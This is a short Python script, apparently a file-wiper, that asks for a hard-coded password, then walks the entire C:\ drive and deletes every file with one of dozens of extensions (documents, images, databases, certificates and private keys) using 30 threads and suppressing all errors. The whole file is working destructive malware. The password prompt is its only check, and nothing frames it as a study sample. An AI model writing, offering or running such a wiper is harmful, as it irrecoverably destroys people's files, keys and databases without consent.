import os
from queue import Queue
from threading import Thread

# Safegaurd
safeguard = input('Please put password in to start the program: ')
if safeguard != 'incinerator':
    quit()

# File extensions to locate files
incinerated_ext = ('.txt', '.png', '.jpg', '.jpeg', '.der',
                   '.pfx', '.key', '.crt', '.csr', '.pem',
                   '.odt', '.ott', '.sxw', '.stw', '.uot',
                   '.max', '.ods', '.ots', '.sxc', '.stc',
                   '.dif', '.slk', '.odp', '.otp', '.sxd',
                   'std', '.uop', '.odg', '.otg', '.sxm',
                   '.mml', '.lay', '.lay6', '.asc', '.sqlite3',
                   '.sqlitedb', '.sql', '.accdb', '.mdb', '.dfb',
                   '.odb', '.frm', '.myd', '.myi')

# Grab all file from the machine
file_paths = []
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root+'\\'+file)
        if file_ext in incinerated_ext:
            file_paths.append(root+'\\'+file)


def incinerate():
    while q.not_empty:
        file = q.get()
        try:
            os.remove(file)
        except:
            pass
        q.task_done()


q = Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=incinerate, daemon=True)
    thread.start()

q.join()
